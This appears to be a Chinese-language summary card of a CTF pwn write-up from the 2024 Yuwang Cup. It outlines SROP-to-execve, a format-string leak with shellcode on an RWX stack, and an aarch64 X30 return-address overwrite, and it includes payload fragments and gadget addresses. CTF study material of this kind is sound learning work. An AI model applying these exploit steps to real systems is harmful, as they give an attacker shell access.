---
title: "第八届御网杯 线上下线 pwn Writeup by Mini-Venom"
category: pwn
tags: ["御网杯", "pwn", "SROP", "sigreturn", "ret2syscall", "RWX-stack"]
signals: ["御网杯 2024", "SROP", "sigreturn", "ret2syscall", "RWX-stack", "fmt-leak", "aarch64", "X30-register", "PIE-2-byte", "pwn_unknown", "PWN", "rax", "x15", "execve"]
difficulty: medium
source: "https://www.ctfiot.com/213477.html"
tools: ["ROP", "x86/x64"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第八届御网杯 线上下线 pwn Writeup by Mini-Venom

> 赛事：御网杯 2024 | 方向：pwn | 难度：medium | 工具：ROP、x86/x64

## 一句话总结

御网杯 3 题 PWN：SROP rax=0x15 sigreturn 调 execve + RWX 栈 fmt 泄 + aarch64 fmt 改 X30 寄存器。

## 攻击链

1. asm (SROP): 控制 rax=0x15 触发 sigreturn → frame.rax=constants.SYS_execve, frame.rdi=bin_sh=0x40200A, frame.rip=0x40102D syscall
2. payload: 8 个 0x40103D/0x401034/0x401030/0x401034 链 + 0x40102D 触发 syscall + bytes(frame)
3. ret: 栈上有 RWX 权限 + fmt 泄栈地址 stack = get_addr64() - 144
4. shellcode = asm(shellcraft.sh()); payload = shellcode.ljust(0x88, b'\x00') + p64(stack)
5. aarch64 normal pwn: 非栈上 fmt 漏洞，返回时栈值赋给 X30 寄存器
6. pie 开了等于没开：仅需改 2 字节，构造栈上 ROP 链改返回地址到后门
7. qemu-aarch64 -L /usr/aarch64-linux-gnu -g 1234 ./pwn 调试

## 关键 payload

```
SROP frame + bin_sh=0x40200A + rip=0x40102D syscall + aarch64 X30 ret overwrite
```

## 经验教训

SROP 是绕过单 syscall gadget 限制的利器；栈 RWX 是 fmt + shellcode 的完美组合；aarch64 X30 寄存器等价于 x86 RIP。

## 标签

SROP、sigreturn、ret2syscall、RWX-stack、fmt-leak、aarch64、X30-register、PIE-2-byte、fmt-overwrite

## 参考来源

- https://www.ctfiot.com/213477.html
- 原文件：第八届御网杯_线上下线pwn_writeup_by_Mini-Venom.full.md
